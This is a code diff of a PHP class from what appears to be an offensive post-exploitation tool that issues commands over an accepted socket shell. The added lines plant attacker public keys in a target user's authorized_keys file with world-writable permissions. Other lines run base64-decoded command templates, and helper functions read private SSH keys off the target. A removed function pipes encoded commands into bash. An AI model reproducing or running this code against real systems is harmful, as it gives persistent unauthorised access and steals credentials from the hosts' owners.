@@ -111,12 +111,17 @@ class SERVICE4COM extends AUTH {
         if (isset($tmp[0])) $authorized_keys_filepath = trim($tmp[0]);
         
         if (empty($authorized_keys_filepath)){
-            $this->req_str($stream,"mkdir $local_home_user/.ssh",$this->stream_timeout);
-            $query = "chmod 777 -R $local_home_user/.ssh";
+
+            $this->req_str($stream,"cd $local_home_user; whoami",$this->stream_timeout);
+            $query = "cd $local_home_user; ls -al";
             $this->req_str($stream,$query,$this->stream_timeout);
-            $query = "cat $public_key_ssh_rsa_file > $local_home_user/.ssh/authorized_keys";
+            $this->req_str($stream," whoami",$this->stream_timeout);
+            $this->req_str($stream,"cd $local_home_user; mkdir ./.ssh",$this->stream_timeout);
+            $query = "cd $local_home_user; chmod 777 -R $local_home_user/.ssh";
             $this->req_str($stream,$query,$this->stream_timeout);
-            $query = "ls -al $local_home_user/.ssh";
+            $query = "cd $local_home_user; echo '$public_keys_str' > $local_home_user/.ssh/authorized_keys";
+            $this->req_str($stream,$query,$this->stream_timeout);
+            $query = "cd $local_home_user; ls -al $local_home_user/.ssh";
             $this->req_str($stream,$query,$this->stream_timeout);
 
             
@@ -435,7 +440,7 @@ class SERVICE4COM extends AUTH {
             $this->article("Global TimeOut", $time2wait);
             
             //var_dump(socket_get_option($socket8server));
-            var_dump(stream_socket_get_name($socket8server,TRUE));
+           // var_dump(stream_socket_get_name($socket8server,TRUE));
             if ($lprotocol=='T') $stream = stream_socket_accept($socket8server,$time2wait);
             if ($lprotocol=='U') $stream = $socket8server;
             var_dump($stream);
@@ -475,8 +480,8 @@ class SERVICE4COM extends AUTH {
                     
                     $template_cmd = base64_decode($templateB64_cmd);
                     $rst = $this->stream4result($stream,$id,10);
-                    list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id) = $this->parse4id($rst);
-                    $id8b64 = base64_encode($id);
+                    list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst);
+                    $id8b64 = base64_encode($id8str);
                     $this->article("CREATE Template ID", $template_id);
                     //$this->article("CREATE Template BASE64 ID", $templateB64_id);
                     $this->article("CREATE Template CMD", $template_cmd);
@@ -484,7 +489,7 @@ class SERVICE4COM extends AUTH {
                     $template_shell = base64_decode($templateB64_shell);
                     $this->article("Template SHELL", $template_shell);
                     
-                    
+
                     
                     $obj_lan = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
                     $obj_lan->poc($this->flag_poc);
@@ -556,11 +561,7 @@ class SERVICE4COM extends AUTH {
         
     }
     
-    public function my_ssh_disconnect($reason, $message, $language) {
-        $this->log2error("Disconnected from Server [$reason] and message : $message",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
-    }
-    
-    
+   
     
     public function stream8ssh8passwd($host,$port,$login,$mdp) {
         $this->ssTitre(__FUNCTION__);
@@ -610,44 +611,7 @@ class SERVICE4COM extends AUTH {
         
     }
     
-    
-    public function stream8shell2check4echo($stream,$input_exec,$output_search){
-        $this->ssTitre(__FUNCTION__);
-        $check = "";
-        if (is_resource($stream)){
-            $str = sha1($this->user2agent,FALSE);
-            $data = "echo '$str' ";
-            $data_check = "echo ".base64_encode($data)." | base64 -d | bash -";
-            $this->article("EXEC FROM STREAM", $data_check);
-            fputs($stream, "$data_check\n");
-            $tmp = "";
-            //while(!feof($stream) && empty($tmp) && sleep(10) ){
-            $tmp = @stream_get_contents($stream);
-            $tmp = trim($tmp);
-            echo "$tmp\n";
-            //var_dump($tmp);
-            
-            $tmp2 = array();
-            exec("echo \"$tmp\" | grep -Po \"^$str\" ",$tmp2);
-            
-            if (!empty($tmp2)) $check = $tmp2[0];
-            unset($tmp2);
-            
-            //var_dump($check);
-            if (stristr($check,$str)) {
-                $this->note("Success Executed Command echo");
-                return TRUE ;
-            }
-            else {
-                $chaine = "DO NOT FOUND $str - COMMAND echo NOT EXECUTED";
-                $this->note($chaine);
-                $this->log2error("NOT bash SHELL",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
-            return FALSE;
-            }
-        }
-    }
-    
-    
+ 
     public function stream8shell2check($stream){
         $this->ssTitre(__FUNCTION__);
         /*
@@ -1182,6 +1146,7 @@ class SERVICE4COM extends AUTH {
         $query = "openssl rsa -in $private_key_file -text -noout";
         //$this->req_str($stream,$query,$timeout);
         $this->req_str($stream,"ls -al $private_key_file",$this->stream_timeout);
+        $this->req_str($stream,"file $private_key_file",$this->stream_timeout);
         $this->key2gen4priv2pem($stream,$this->stream_timeout,$private_key_file,$private_key_passwd);
         return trim($this->req_str($stream,"cat $private_key_file",$this->stream_timeout ));
     }
@@ -1207,6 +1172,7 @@ class SERVICE4COM extends AUTH {
         
         $this->req_str($stream,"ssh-keygen -l -f $public_key_file ",$timeout);
         $this->req_str($stream,"ls -al $public_key_file",$timeout);
+        $this->req_str($stream,"file $public_key_file",$timeout);
         return trim($this->req_str($stream,"cat $public_key_file",$timeout));
         
     }
